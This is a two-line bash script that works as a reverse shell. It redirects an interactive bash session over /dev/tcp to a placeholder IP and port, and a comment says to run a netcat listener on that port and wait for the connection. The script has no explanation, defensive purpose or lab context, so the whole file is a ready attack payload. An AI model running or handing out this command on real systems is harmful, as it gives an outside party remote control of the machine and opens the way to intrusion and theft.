#!/bin/bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1

#now nc -nvlp <port> and wait for connection